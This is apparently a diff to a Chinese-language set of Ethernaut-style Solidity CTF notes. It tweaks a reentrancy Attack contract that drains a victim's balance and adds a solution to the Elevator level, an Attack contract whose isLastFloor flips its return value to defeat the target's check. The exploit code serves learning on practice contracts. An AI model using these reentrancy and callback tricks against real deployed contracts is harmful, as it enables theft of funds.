@@ -505,7 +505,7 @@ contract Attack {
     receive() external payable {
         if (address(victimContract).balance >= 0.001 ether) {
             victimContract.withdraw(0.001 ether);
-        } else {
+        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
             victimContract.withdraw(address(victimContract).balance);
         }
     }
@@ -520,4 +520,63 @@ contract Attack {
     }
 }
 ```
-attack 的时候传 0.001 ether 即可
+attack 的时候传 0.001 ether 即可。
+
+# Elevator
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+目标让 top 变成 true。下面这一段代码看起来是无法满足的，但 building 合约是自己控制的，可以在里面反转 isLastFloor 的返回值，先返回 false 然后返回 true。
+```solidity
+if (!building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;    
+}
+
+contract Attack {
+    IElevator public victimContract = IElevator(0xB85c9b8D0499B6D143675FF579755d2dEEaccDEa);
+    bool public toggle = true;
+
+    constructor(){}
+    
+    function isLastFloor(uint256) public returns (bool){
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function attack() public payable {
+        victimContract.goTo(1);
+    }
+}
+```
+
+这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。
